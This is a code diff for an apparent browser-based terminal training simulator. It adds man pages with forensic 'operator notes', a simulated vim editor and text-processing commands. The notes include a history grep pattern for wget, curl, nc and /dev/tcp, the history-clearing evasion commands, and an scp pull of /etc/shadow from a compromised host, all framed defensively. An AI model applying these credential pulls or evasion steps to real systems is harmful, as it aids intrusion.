+            'systemctl': `SYSTEMCTL(1)                     systemctl                     SYSTEMCTL(1)
+
+NAME
+       systemctl - Control the systemd system and service manager
+
+SYNOPSIS
+       systemctl [OPTIONS...] COMMAND [UNIT...]
+
+DESCRIPTION
+       systemctl may be used to introspect and control the state of the
+       "systemd" system and service manager.
+
+COMMANDS
+       Unit Commands:
+           start PATTERN...          Start (activate) units
+           stop PATTERN...           Stop (deactivate) units
+           restart PATTERN...        Restart units
+           reload PATTERN...         Reload units
+           status [PATTERN...]       Show runtime status of units
+           enable UNIT...            Enable unit to start at boot
+           disable UNIT...           Disable unit from starting at boot
+           is-active PATTERN...      Check if units are active
+           is-enabled UNIT...        Check if units are enabled
+
+EXAMPLES
+       systemctl status nginx
+              Check nginx service status.
+
+       systemctl start nginx
+              Start nginx service.
+
+       systemctl enable nginx
+              Enable nginx to start at boot.
+
+       systemctl restart nginx
+              Restart nginx service.
+
+       systemctl list-units --type=service
+              List all services.
+
+OPERATOR NOTES
+       Use systemctl when you need to:
+       • Manage services (start, stop, restart)
+       • Check service status and health
+       • Enable/disable services at boot
+       • Investigate what services are running
+
+       Pro tip: systemctl is essential for service reconnaissance.
+       systemctl list-units --type=service --state=running  # Active services
+       systemctl list-unit-files | grep enabled  # Boot-enabled services
+       systemctl status sshd  # Check if SSH is running
+
+       Look for suspicious services or unfamiliar unit files.
+       Malware often installs as systemd services for persistence.
+       Check /etc/systemd/system/ for rogue unit files.
+
+SEE ALSO
+       systemd(1), journalctl(1), service(8)`,
+
+            // Editors
+            'vim': `VIM(1)                          User Commands                         VIM(1)
+
+NAME
+       vim - Vi IMproved, a programmer's text editor
+
+SYNOPSIS
+       vim [options] [file ..]
+
+DESCRIPTION
+       Vim is an improved version of the vi editor. It has many improvements:
+       multi level undo, multi windows, syntax highlighting, command line
+       editing, and much more.
+
+MODES
+       Normal mode    Navigate and manipulate text (default mode).
+       Insert mode    Enter text (press i, a, o to enter).
+       Visual mode    Select text (press v to enter).
+       Command mode   Execute commands (press : to enter).
+
+BASIC COMMANDS
+       i              Enter insert mode.
+       Esc            Return to normal mode.
+       :w             Write (save) file.
+       :q             Quit (fails if unsaved changes).
+       :q!            Quit without saving.
+       :wq or ZZ      Write and quit.
+
+MOVEMENT
+       h j k l        Left, down, up, right.
+       w b            Forward/backward by word.
+       0 $            Start/end of line.
+       gg G           Start/end of file.
+
+EDITING
+       x              Delete character.
+       dd             Delete line.
+       yy             Yank (copy) line.
+       p              Paste after cursor.
+       u              Undo.
+       Ctrl+r         Redo.
+
+SEARCH
+       /pattern       Search forward.
+       ?pattern       Search backward.
+       n N            Next/previous match.
+
+OPERATOR NOTES
+       Use vim when you need to:
+       • Edit configuration files on remote systems
+       • Make quick changes without a GUI
+       • Work efficiently through keyboard-only access
+       • Survive when nano isn't available
+
+       Pro tip: vim is the operator's editor - learn it or suffer.
+       Minimum survival kit:
+       1. i    → Enter insert mode, type your changes
+       2. Esc  → Return to normal mode
+       3. :wq  → Save and quit
+       4. :q!  → Quit without saving (escape hatch)
+
+       "How do I exit vim?" - The eternal question.
+       Answer: Esc, then :q! (always works)
+
+SEE ALSO
+       vi(1), nano(1), emacs(1)`,
+
+            'nano': `NANO(1)                         User Commands                        NANO(1)
+
+NAME
+       nano - Nano's ANOther editor, inspired by Pico
+
+SYNOPSIS
+       nano [OPTIONS] [[+LINE[,COLUMN]] FILE]...
+
+DESCRIPTION
+       nano is a small and friendly editor.
+
+KEY BINDINGS
+       ^G     Display help text.
+       ^X     Close the current buffer / Exit from nano.
+       ^O     Write the current buffer (or marked region) to disk.
+       ^R     Insert another file into the current buffer.
+       ^W     Search forward for a string or regular expression.
+
+       ^K     Cut the current line and store it in the cutbuffer.
+       ^U     Uncut (paste) from the cutbuffer into the current line.
+       ^J     Justify the current paragraph.
+
+       ^Y     Go one screenful up.
+       ^V     Go one screenful down.
+
+       ^A     Go to beginning of current line.
+       ^E     Go to end of current line.
+
+EXAMPLES
+       nano file.txt
+              Edit file.txt.
+
+       nano +10 file.txt
+              Open at line 10.
+
+OPERATOR NOTES
+       Use nano when you need to:
+       • Edit files with minimal learning curve
+       • Make quick config changes
+       • Introduce beginners to command-line editing
+       • When vim feels like overkill
+
+       Pro tip: nano is beginner-friendly but less powerful than vim.
+       Key commands shown at bottom of screen (^ means Ctrl).
+       ^O = Save (Write Out), ^X = Exit
+       ^W = Search, ^K = Cut line, ^U = Paste
+
+       On some systems, nano isn't installed but vim always is.
+       Learn vim basics as your backup editor.
+
+SEE ALSO
+       vim(1), emacs(1)`,
+
+            // SSH/Remote
+            'ssh': `SSH(1)                      BSD General Commands Manual                     SSH(1)
+
+NAME
+     ssh -- OpenSSH remote login client
+
+SYNOPSIS
+     ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]
+         [-c cipher_spec] [-D [bind_address:]port] [-E log_file]
+         [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file]
+         [-J destination] [-L address] [-l login_name] [-m mac_spec]
+         [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]
+         [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
+         destination [command [argument ...]]
+
+DESCRIPTION
+     ssh is a program for logging into a remote machine and for executing
+     commands on a remote machine.
+
+     -i identity_file
+             Selects a file from which the identity (private key) is read.
+
+     -l login_name
+             Specifies the user to log in as on the remote machine.
+
+     -p port
+             Port to connect to on the remote host.
+
+     -v      Verbose mode. Causes ssh to print debugging messages.
+
+EXAMPLES
+     ssh user@hostname
+             Connect to hostname as user.
+
+     ssh -p 2222 user@hostname
+             Connect on non-standard port.
+
+     ssh -i ~/.ssh/id_rsa user@host
+             Use specific key file.
+
+     ssh user@host 'ls -la'
+             Execute command on remote host.
+
+OPERATOR NOTES
+     Use ssh when you need to:
+     • Securely connect to remote systems
+     • Execute commands remotely
+     • Create encrypted tunnels
+     • Transfer files securely (with scp)
+
+     Pro tip: ssh is the primary tool for remote access.
+     ssh -L 8080:internal:80 user@jump  # Local port forward
+     ssh -D 9050 user@host              # SOCKS proxy
+     ssh -J jump@jumphost user@target   # Jump through bastion
+
+     Key security: Check ~/.ssh/known_hosts for connections.
+     Compromised keys can grant persistent access.
+     Look for authorized_keys backdoors in ~/.ssh/
+
+SEE ALSO
+     scp(1), sftp(1), ssh-keygen(1), ssh_config(5)`,
+
+            'scp': `SCP(1)                      BSD General Commands Manual                     SCP(1)
+
+NAME
+     scp -- secure copy (remote file copy program)
+
+SYNOPSIS
+     scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
+         [-J destination] [-l limit] [-o ssh_option] [-P port]
+         [-S program] source ... target
+
+DESCRIPTION
+     scp copies files between hosts on a network.
+
+     -P port
+             Specifies the port to connect to on the remote host.
+
+     -r      Recursively copy entire directories.
+
+     -i identity_file
+             Selects the file from which the identity (private key) is read.
+
+EXAMPLES
+     scp file.txt user@remote:/path/
+             Copy local file to remote.
+
+     scp user@remote:/path/file.txt ./
+             Copy remote file to local.
+
+     scp -r directory/ user@remote:/path/
+             Copy directory recursively.
+
+     scp -P 2222 file.txt user@host:/path/
+             Copy using non-standard port.
+
+OPERATOR NOTES
+     Use scp when you need to:
+     • Securely transfer evidence files during incident response
+     • Exfiltrate logs or artifacts for offline analysis
+     • Deploy tools or scripts to remote systems
+     • Back up critical files before forensic analysis
+
+     Pro tip: scp uses SSH for transport - same keys, same security:
+     scp -i ~/.ssh/id_rsa evidence.tar user@analyst:/cases/   # Use specific key
+     scp -r /var/log/ user@siem:/incoming/                    # Full log grab
+     scp user@compromised:/etc/shadow ./evidence/             # Pull for analysis
+     For large transfers, consider rsync (has resume capability)
+
+SEE ALSO
+     ssh(1), sftp(1), rsync(1)`,
+
+            // Package management
+            'apt': `APT(8)                                APT                               APT(8)
+
+NAME
+       apt - command-line interface
+
+SYNOPSIS
+       apt [-h] [-o=config_string] [-c=config_file] [-t=target_release]
+           [-a=architecture] {update | upgrade | full-upgrade | install pkg...
+           | remove pkg... | purge pkg... | autoremove | search regex |
+           show pkg | list | edit-sources}
+
+DESCRIPTION
+       apt provides a high-level commandline interface for the package
+       management system.
+
+COMMANDS
+       update
+           Update list of available packages.
+
+       upgrade
+           Upgrade all installed packages to their newest versions.
+
+       install package...
+           Install packages.
+
+       remove package...
+           Remove packages.
+
+       search regex
+           Search for packages.
+
+       show package
+           Show package details.
+
+       list --installed
+           List installed packages.
+
+EXAMPLES
+       apt update
+           Update package lists.
+
+       apt upgrade
+           Upgrade all packages.
+
+       apt install nginx
+           Install nginx.
+
+       apt remove nginx
+           Remove nginx.
+
+       apt search apache
+           Search for apache packages.
+
+OPERATOR NOTES
+       Use apt when you need to:
+       • Audit installed software on a system (apt list --installed)
+       • Check for security vulnerabilities in packages
+       • Inventory software during incident response
+       • Install forensic or analysis tools on a live system
+
+       Pro tip: apt is your software inventory goldmine:
+       apt list --installed | wc -l                    # Total package count
+       apt list --installed | grep -i security         # Security-related pkgs
+       apt show suspicious-package                     # Get package details
+       apt-cache policy package                        # See version & repo source
+       Check /var/log/apt/history.log for recent installs by an attacker
+
+SEE ALSO
+       apt-get(8), apt-cache(8), dpkg(1)`,
+
+            'dpkg': `DPKG(1)                          dpkg suite                         DPKG(1)
+
+NAME
+       dpkg - package manager for Debian
+
+SYNOPSIS
+       dpkg [option...] action
+
+DESCRIPTION
+       dpkg is a tool to install, build, remove and manage Debian packages.
+
+       -i, --install package_file...
+           Install the package.
+
+       -r, --remove package...
+           Remove an installed package.
+
+       -l, --list [package-name-pattern...]
+           List packages matching pattern.
+
+       -s, --status package-name...
+           Report status of specified package.
+
+       -L, --listfiles package-name...
+           List files installed from a package.
+
+EXAMPLES
+       dpkg -i package.deb
+           Install a .deb file.
+
+       dpkg -r package-name
+           Remove a package.
+
+       dpkg -l
+           List all installed packages.
+
+       dpkg -l | grep nginx
+           Find installed nginx packages.
+
+OPERATOR NOTES
+       Use dpkg when you need to:
+       • List all files belonging to a specific package
+       • Find which package owns a suspicious file
+       • Verify package integrity (modified files)
+       • Install local .deb files during analysis setup
+
+       Pro tip: dpkg gives you low-level package forensics:
+       dpkg -L nginx                                   # All files from nginx package
+       dpkg -S /usr/bin/suspicious                     # What package owns this file?
+       dpkg --verify package-name                      # Check for modified files
+       dpkg -l | awk '/^ii/ {print $2}'                # Clean list of installed pkgs
+       Modified files from --verify may indicate tampering or backdoors
+
+SEE ALSO
+       apt(8), apt-get(8)`,
+
+            // Misc
+            'echo': `ECHO(1)                         User Commands                        ECHO(1)
+
+NAME
+       echo - display a line of text
+
+SYNOPSIS
+       echo [SHORT-OPTION]... [STRING]...
+
+DESCRIPTION
+       Echo the STRING(s) to standard output.
+
+       -n     do not output the trailing newline
+
+       -e     enable interpretation of backslash escapes
+
+       -E     disable interpretation of backslash escapes (default)
+
+       If -e is in effect, the following sequences are recognized:
+       \\\\    backslash
+       \\n    new line
+       \\t    horizontal tab
+
+EXAMPLES
+       echo "Hello World"
+           Print Hello World.
+
+       echo -n "no newline"
+           Print without trailing newline.
+
+       echo -e "Line1\\nLine2"
+           Print with newlines interpreted.
+
+       echo $HOME
+           Print value of HOME variable.
+
+OPERATOR NOTES
+       Use echo when you need to:
+       • Inspect environment variable values
+       • Create quick files for testing (echo "data" > file)
+       • Append data to logs or config files
+       • Debug scripts by printing variable states
+
+       Pro tip: echo is your quick-write and debug tool:
+       echo $PATH | tr ':' '\\n'                        # Show PATH directories
+       echo "malicious_ip" >> /etc/hosts.deny          # Quick block
+       echo '#!/bin/bash' > script.sh                  # Start a script
+       echo -e "line1\\nline2" > multiline.txt         # Create multiline file
+       Check .bashrc for malicious echo commands adding to PATH
+
+SEE ALSO
+       printf(1)`,
+
+            'history': `HISTORY(1)                   Bash Builtins                       HISTORY(1)
+
+NAME
+       history - display command history
+
+SYNOPSIS
+       history [n]
+       history -c
+       history -d offset
+       history [-anrw] [filename]
+
+DESCRIPTION
+       Display or manipulate the history list.
+
+       -c     Clear the history list by deleting all entries.
+
+       -d offset
+              Delete the history entry at position offset.
+
+       n      Display only the last n history entries.
+
+       !n     Execute command number n from history.
+
+       !!     Execute the previous command.
+
+       !string
+              Execute most recent command starting with string.
+
+EXAMPLES
+       history
+           Show all command history.
+
+       history 20
+           Show last 20 commands.
+
+       !100
+           Execute command #100.
+
+       !!
+           Repeat last command.
+
+OPERATOR NOTES
+       Use history when you need to:
+       • See what commands were executed by a user (forensics gold)
+       • Track attacker activity on a compromised system
+       • Re-execute previous complex commands
+       • Audit your own session for documentation
+
+       Pro tip: history is a forensic treasure trove:
+       history | grep -E 'wget|curl|nc|/dev/tcp'       # Download/C2 activity
+       history | grep -E 'chmod|chown|sudo'            # Privilege activity
+       cat ~/.bash_history                             # Persistent history file
+       HISTTIMEFORMAT="%F %T " history                 # Show timestamps
+       Attackers often run 'history -c' or 'unset HISTFILE' - check for gaps!
+       Also check /home/*/.bash_history for all users
+
+SEE ALSO
+       bash(1)`
+        };
+
+        // Check for man page
+        if (manPages[cmd]) {
+            return manPages[cmd];
+        }
+
+        // Check for alias commands
+        const aliases = {
+            'vi': 'vim',
+            'netcat': 'nc'
+        };
+        if (aliases[cmd] && manPages[aliases[cmd]]) {
+            return manPages[aliases[cmd]];
+        }
+
+        return `No manual entry for ${cmd}`;
     }
 
     _cmdGrep(args) {
@@ -4526,8 +7260,508 @@ other::r--`;
 
     _cmdVim(args) {
         const file = args.filter(a => !a.startsWith('-'))[0];
-        return `[Vim simulation - file: ${file || '(new)'}]
-Vim commands: i (insert), Esc (normal), :w (save), :q (quit), :wq (save+quit)`;
+
+        // Initialize vim mode
+        this._vimFile = file ? this._resolvePath(file) : null;
+        this._vimMode = 'normal';
+        this._vimCursorLine = 0;
+        this._vimCursorCol = 0;
+        this._vimCommandBuffer = '';
+        this._vimMessage = '';
+        this._vimModified = false;
+
+        // Load file content or start with empty buffer
+        if (this._vimFile && this.fs[this._vimFile]) {
+            this._vimContent = (this.fs[this._vimFile].content || '').split('\n');
+        } else {
+            this._vimContent = [''];
+            if (this._vimFile) {
+                this._vimMessage = `"${file}" [New File]`;
+            }
+        }
+
+        // Hide the command input visually but keep it focusable for keyboard events
+        this.inputEl.style.opacity = '0';
+        this.inputEl.style.position = 'absolute';
+        this.inputEl.style.pointerEvents = 'none';
+        this.inputEl.focus();
+        this._renderVim();
+
+        return ''; // No output, vim takes over the display
+    }
+
+    _handleVimKey(e) {
+        e.preventDefault();
+
+        if (this._vimMode === 'command') {
+            this._handleVimCommandMode(e);
+        } else if (this._vimMode === 'insert') {
+            this._handleVimInsertMode(e);
+        } else {
+            this._handleVimNormalMode(e);
+        }
+
+        this._renderVim();
+    }
+
+    _handleVimNormalMode(e) {
+        const key = e.key;
+
+        // Movement keys
+        switch (key) {
+            case 'h': case 'ArrowLeft':
+                this._vimCursorCol = Math.max(0, this._vimCursorCol - 1);
+                break;
+            case 'j': case 'ArrowDown':
+                this._vimCursorLine = Math.min(this._vimContent.length - 1, this._vimCursorLine + 1);
+                this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
+                break;
+            case 'k': case 'ArrowUp':
+                this._vimCursorLine = Math.max(0, this._vimCursorLine - 1);
+                this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
+                break;
+            case 'l': case 'ArrowRight':
+                const lineLen = (this._vimContent[this._vimCursorLine] || '').length;
+                this._vimCursorCol = Math.min(lineLen, this._vimCursorCol + 1);
+                break;
+            case '0':
+                this._vimCursorCol = 0;
+                break;
+            case '$':
+                this._vimCursorCol = (this._vimContent[this._vimCursorLine] || '').length;
+                break;
+            case 'g':
+                if (this._vimCommandBuffer === 'g') {
+                    this._vimCursorLine = 0;
+                    this._vimCursorCol = 0;
+                    this._vimCommandBuffer = '';
+                } else {
+                    this._vimCommandBuffer = 'g';
+                }
+                break;
+            case 'G':
+                this._vimCursorLine = this._vimContent.length - 1;
+                this._vimCursorCol = 0;
+                break;
+            case 'w':
+                // Move to next word
+                this._vimMoveWord(1);
+                break;
+            case 'b':
+                // Move to previous word
+                this._vimMoveWord(-1);
+                break;
+
+            // Enter insert mode
+            case 'i':
+                this._vimMode = 'insert';
+                this._vimMessage = '-- INSERT --';
+                break;
+            case 'a':
+                this._vimMode = 'insert';
+                this._vimCursorCol = Math.min(this._vimCursorCol + 1, (this._vimContent[this._vimCursorLine] || '').length);
+                this._vimMessage = '-- INSERT --';
+                break;
+            case 'A':
+                this._vimMode = 'insert';
+                this._vimCursorCol = (this._vimContent[this._vimCursorLine] || '').length;
+                this._vimMessage = '-- INSERT --';
+                break;
+            case 'I':
+                this._vimMode = 'insert';
+                this._vimCursorCol = 0;
+                this._vimMessage = '-- INSERT --';
+                break;
+            case 'o':
+                this._vimContent.splice(this._vimCursorLine + 1, 0, '');
+                this._vimCursorLine++;
+                this._vimCursorCol = 0;
+                this._vimMode = 'insert';
+                this._vimMessage = '-- INSERT --';
+                this._vimModified = true;
+                break;
+            case 'O':
+                this._vimContent.splice(this._vimCursorLine, 0, '');
+                this._vimCursorCol = 0;
+                this._vimMode = 'insert';
+                this._vimMessage = '-- INSERT --';
+                this._vimModified = true;
+                break;
+
+            // Editing
+            case 'x':
+                // Delete character under cursor
+                if (this._vimContent[this._vimCursorLine]) {
+                    const line = this._vimContent[this._vimCursorLine];
+                    this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol) + line.slice(this._vimCursorCol + 1);
+                    this._vimModified = true;
+                }
+                break;
+            case 'd':
+                if (this._vimCommandBuffer === 'd') {
+                    // dd - delete line
+                    if (this._vimContent.length > 1) {
+                        this._vimContent.splice(this._vimCursorLine, 1);
+                        this._vimCursorLine = Math.min(this._vimCursorLine, this._vimContent.length - 1);
+                    } else {
+                        this._vimContent[0] = '';
+                    }
+                    this._vimModified = true;
+                    this._vimCommandBuffer = '';
+                } else {
+                    this._vimCommandBuffer = 'd';
+                }
+                break;
+            case 'y':
+                if (this._vimCommandBuffer === 'y') {
+                    // yy - yank line
+                    this._vimYankBuffer = this._vimContent[this._vimCursorLine];
+                    this._vimMessage = '1 line yanked';
+                    this._vimCommandBuffer = '';
+                } else {
+                    this._vimCommandBuffer = 'y';
+                }
+                break;
+            case 'p':
+                // Paste after
+                if (this._vimYankBuffer !== undefined) {
+                    this._vimContent.splice(this._vimCursorLine + 1, 0, this._vimYankBuffer);
+                    this._vimCursorLine++;
+                    this._vimModified = true;
+                }
+                break;
+            case 'P':
+                // Paste before
+                if (this._vimYankBuffer !== undefined) {
+                    this._vimContent.splice(this._vimCursorLine, 0, this._vimYankBuffer);
+                    this._vimModified = true;
+                }
+                break;
+            case 'u':
+                this._vimMessage = 'Undo not supported in simulation';
+                break;
+
+            // Enter command mode
+            case ':':
+                this._vimMode = 'command';
+                this._vimCommandBuffer = ':';
+                break;
+
+            // Search (basic)
+            case '/':
+                this._vimMode = 'command';
+                this._vimCommandBuffer = '/';
+                break;
+
+            // Escape clears command buffer
+            case 'Escape':
+                this._vimCommandBuffer = '';
+                this._vimMessage = '';
+                break;
+
+            default:
+                // Clear buffer for unrecognized keys
+                if (this._vimCommandBuffer && key.length === 1) {
+                    this._vimCommandBuffer = '';
+                }
+        }
+    }
+
+    _handleVimInsertMode(e) {
+        const key = e.key;
+
+        if (key === 'Escape') {
+            this._vimMode = 'normal';
+            this._vimMessage = '';
+            this._vimCursorCol = Math.max(0, this._vimCursorCol - 1);
+            return;
+        }
+
+        const line = this._vimContent[this._vimCursorLine] || '';
+
+        if (key === 'Backspace') {
+            if (this._vimCursorCol > 0) {
+                this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol - 1) + line.slice(this._vimCursorCol);
+                this._vimCursorCol--;
+            } else if (this._vimCursorLine > 0) {
+                // Join with previous line
+                const prevLine = this._vimContent[this._vimCursorLine - 1] || '';
+                this._vimCursorCol = prevLine.length;
+                this._vimContent[this._vimCursorLine - 1] = prevLine + line;
+                this._vimContent.splice(this._vimCursorLine, 1);
+                this._vimCursorLine--;
+            }
+            this._vimModified = true;
+        } else if (key === 'Enter') {
+            const before = line.slice(0, this._vimCursorCol);
+            const after = line.slice(this._vimCursorCol);
+            this._vimContent[this._vimCursorLine] = before;
+            this._vimContent.splice(this._vimCursorLine + 1, 0, after);
+            this._vimCursorLine++;
+            this._vimCursorCol = 0;
+            this._vimModified = true;
+        } else if (key === 'Tab') {
+            this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol) + '    ' + line.slice(this._vimCursorCol);
+            this._vimCursorCol += 4;
+            this._vimModified = true;
+        } else if (key === 'ArrowLeft') {
+            this._vimCursorCol = Math.max(0, this._vimCursorCol - 1);
+        } else if (key === 'ArrowRight') {
+            this._vimCursorCol = Math.min(line.length, this._vimCursorCol + 1);
+        } else if (key === 'ArrowUp') {
+            this._vimCursorLine = Math.max(0, this._vimCursorLine - 1);
+            this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
+        } else if (key === 'ArrowDown') {
+            this._vimCursorLine = Math.min(this._vimContent.length - 1, this._vimCursorLine + 1);
+            this._vimCursorCol = Math.min(this._vimCursorCol, (this._vimContent[this._vimCursorLine] || '').length);
+        } else if (key.length === 1) {
+            // Insert character
+            this._vimContent[this._vimCursorLine] = line.slice(0, this._vimCursorCol) + key + line.slice(this._vimCursorCol);
+            this._vimCursorCol++;
+            this._vimModified = true;
+        }
+    }
+
+    _handleVimCommandMode(e) {
+        const key = e.key;
+
+        if (key === 'Escape') {
+            this._vimMode = 'normal';
+            this._vimCommandBuffer = '';
+            this._vimMessage = '';
+            return;
+        }
+
+        if (key === 'Enter') {
+            this._executeVimCommand(this._vimCommandBuffer);
+            return;
+        }
+
+        if (key === 'Backspace') {
+            if (this._vimCommandBuffer.length > 1) {
+                this._vimCommandBuffer = this._vimCommandBuffer.slice(0, -1);
+            } else {
+                this._vimMode = 'normal';
+                this._vimCommandBuffer = '';
+            }
+            return;
+        }
+
+        if (key.length === 1) {
+            this._vimCommandBuffer += key;
+        }
+    }
+
+    _executeVimCommand(cmd) {
+        const command = cmd.slice(1); // Remove leading : or /
+
+        if (cmd.startsWith('/')) {
+            // Search
+            const pattern = command;
+            if (pattern) {
+                const regex = new RegExp(pattern, 'i');
+                for (let i = this._vimCursorLine + 1; i < this._vimContent.length; i++) {
+                    if (regex.test(this._vimContent[i])) {
+                        this._vimCursorLine = i;
+                        this._vimCursorCol = this._vimContent[i].search(regex);
+                        this._vimMessage = '';
+                        break;
+                    }
+                }
+            }
+            this._vimMode = 'normal';
+            this._vimCommandBuffer = '';
+            return;
+        }
+
+        // Command mode commands
+        switch (command) {
+            case 'w':
+                this._vimSave();
+                break;
+            case 'q':
+                if (this._vimModified) {
+                    this._vimMessage = 'E37: No write since last change (add ! to override)';
+                } else {
+                    this._exitVim();
+                    return; // Exit before resetting _vimMode
+                }
+                break;
+            case 'q!':
+                this._exitVim();
+                return; // Exit before resetting _vimMode
+            case 'wq':
+            case 'x':
+                this._vimSave();
+                this._exitVim();
+                return; // Exit before resetting _vimMode
+            case 'set nu':
+            case 'set number':
+                this._vimShowLineNumbers = true;
+                this._vimMessage = '';
+                break;
+            case 'set nonu':
+            case 'set nonumber':
+                this._vimShowLineNumbers = false;
+                this._vimMessage = '';
+                break;
+            default:
+                if (command.match(/^\d+$/)) {
+                    // Go to line number
+                    const lineNum = parseInt(command) - 1;
+                    this._vimCursorLine = Math.max(0, Math.min(lineNum, this._vimContent.length - 1));
+                    this._vimCursorCol = 0;
+                    this._vimMessage = '';
+                } else {
+                    this._vimMessage = `E492: Not an editor command: ${command}`;
+                }
+        }
+
+        this._vimMode = 'normal';
+        this._vimCommandBuffer = '';
+    }
+
+    _vimSave() {
+        if (!this._vimFile) {
+            this._vimMessage = 'E32: No file name';
+            return;
+        }
+
+        const content = this._vimContent.join('\n');
+        const parentPath = this._vimFile.substring(0, this._vimFile.lastIndexOf('/')) || '/';
+        const fileName = this._vimFile.substring(this._vimFile.lastIndexOf('/') + 1);
+
+        // Create or update file
+        this.fs[this._vimFile] = {
+            type: 'file',
+            content: content,
+            perms: '-rw-r--r--',
+            owner: this.user,
+            group: this.user
+        };
+
+        // Add to parent directory if not already there
+        if (this.fs[parentPath] && this.fs[parentPath].children && !this.fs[parentPath].children.includes(fileName)) {
+            this.fs[parentPath].children.push(fileName);
+        }
+
+        this._vimModified = false;
+        this._vimMessage = `"${this._vimFile}" ${this._vimContent.length}L, ${content.length}C written`;
+    }
+
+    _exitVim() {
+        this._vimMode = null;
+        this._vimFile = null;
+        this._vimContent = [];
+        this._vimCommandBuffer = '';
+        this._vimMessage = '';
+
+        // Restore terminal display and input visibility
+        this.inputEl.style.opacity = '';
+        this.inputEl.style.position = '';
+        this.inputEl.style.pointerEvents = '';
+        this.inputEl.value = ''; // Clear any leftover input
+        this._renderVimCleanup();
+        this.inputEl.focus();
+    }
+
+    _vimMoveWord(direction) {
+        const line = this._vimContent[this._vimCursorLine] || '';
+        if (direction > 0) {
+            // Forward
+            const rest = line.slice(this._vimCursorCol);
+            const match = rest.match(/^\S*\s*/);
+            if (match) {
+                this._vimCursorCol += match[0].length;
+                if (this._vimCursorCol >= line.length && this._vimCursorLine < this._vimContent.length - 1) {
+                    this._vimCursorLine++;
+                    this._vimCursorCol = 0;
+                }
+            }
+        } else {
+            // Backward
+            if (this._vimCursorCol === 0 && this._vimCursorLine > 0) {
+                this._vimCursorLine--;
+                this._vimCursorCol = (this._vimContent[this._vimCursorLine] || '').length;
+            } else {
+                const before = line.slice(0, this._vimCursorCol);
+                const match = before.match(/\s*\S*$/);
+                if (match) {
+                    this._vimCursorCol -= match[0].length;
+                }
+            }
+        }
+    }
+
+    _renderVim() {
+        // Create vim-style display
+        const visibleLines = 20;
+        const startLine = Math.max(0, this._vimCursorLine - Math.floor(visibleLines / 2));
+        const endLine = Math.min(this._vimContent.length, startLine + visibleLines);
+
+        let html = '<div class="vim-editor" style="font-family: monospace; background: #1a1a1a; color: #ccc; padding: 10px;">';
+
+        // Header line (like vim)
+        const fileName = this._vimFile ? this._vimFile.split('/').pop() : '[No Name]';
+        html += `<div style="color: #666; margin-bottom: 5px;">${fileName}${this._vimModified ? ' [+]' : ''}</div>`;
+
+        // Content lines with cursor
+        for (let i = startLine; i < endLine; i++) {
+            const lineNum = this._vimShowLineNumbers ? `<span style="color: #666; margin-right: 10px;">${String(i + 1).padStart(3)}</span>` : '';
+            const line = this._vimContent[i] || '';
+
+            if (i === this._vimCursorLine) {
+                // Line with cursor
+                const before = this._escapeHtml(line.slice(0, this._vimCursorCol));
+                const cursor = line[this._vimCursorCol] || ' ';
+                const after = this._escapeHtml(line.slice(this._vimCursorCol + 1));
+                const cursorStyle = this._vimMode === 'insert'
+                    ? 'border-left: 2px solid #0f0; background: transparent;'
+                    : 'background: #fff; color: #000;';
+                html += `<div>${lineNum}${before}<span style="${cursorStyle}">${this._escapeHtml(cursor)}</span>${after}</div>`;
+            } else {
+                html += `<div>${lineNum}${this._escapeHtml(line) || ' '}</div>`;
+            }
+        }
+
+        // Fill empty lines with ~
+        for (let i = endLine; i < startLine + visibleLines; i++) {
+            html += `<div style="color: #00f;">~</div>`;
+        }
+
+        // Status line
+        const modeDisplay = this._vimMode === 'insert' ? '-- INSERT --' :
+                           this._vimMode === 'command' ? this._vimCommandBuffer : '';
+        const posInfo = `${this._vimCursorLine + 1},${this._vimCursorCol + 1}`;
+
+        html += `<div style="margin-top: 5px; display: flex; justify-content: space-between; color: #0f0;">`;
+        html += `<span>${this._vimMessage || modeDisplay}</span>`;
+        html += `<span>${posInfo}</span>`;
+        html += `</div>`;
+
+        // Command line (when in command mode)
+        if (this._vimMode === 'command') {
+            html += `<div style="color: #fff;">${this._vimCommandBuffer}<span style="background: #fff; color: #000;"> </span></div>`;
+        }
+
+        html += '</div>';
+
+        // Replace terminal content with vim editor
+        this.outputEl.innerHTML = html;
+
+        // Add click handler to maintain focus
+        this.outputEl.onclick = () => {
+            if (this._vimMode) {
+                this.inputEl.focus();
+            }
+        };
+    }
+
+    _renderVimCleanup() {
+        // Remove vim click handler
+        this.outputEl.onclick = null;
+        // Restore normal terminal output
+        this.outputEl.innerHTML = '';
     }
 
     _cmdVmstat() {
@@ -4554,6 +7788,799 @@ sda               5.23        45.67        89.12    1234567    2345678`;
 10:20:00 AM     all      3.12      0.00      1.05      0.22      0.00     95.61
 10:30:00 AM     all      2.89      0.00      0.87      0.18      0.00     96.06
 Average:        all      2.78      0.00      0.97      0.18      0.00     96.07`;
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // TEXT PROCESSING COMMANDS
+    // ═══════════════════════════════════════════════════════════════
+
+    _cmdSort(args) {
+        const reverse = args.includes('-r');
+        const numeric = args.includes('-n');
+        const unique = args.includes('-u');
+        const file = args.filter(a => !a.startsWith('-'))[0];
+
+        let content = this.pipeInput || '';
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `sort: ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `sort: ${file}: Is a directory`;
+            content = entry.content || '';
+        }
+
+        if (!content) return '';
+
+        let lines = content.split('\n').filter(l => l);
+
+        if (numeric) {
+            lines.sort((a, b) => {
+                const numA = parseFloat(a) || 0;
+                const numB = parseFloat(b) || 0;
+                return numA - numB;
+            });
+        } else {
+            lines.sort();
+        }
+
+        if (reverse) lines.reverse();
+        if (unique) lines = [...new Set(lines)];
+
+        return lines.join('\n');
+    }
+
+    _cmdUniq(args) {
+        const count = args.includes('-c');
+        const duplicatesOnly = args.includes('-d');
+        const uniqueOnly = args.includes('-u');
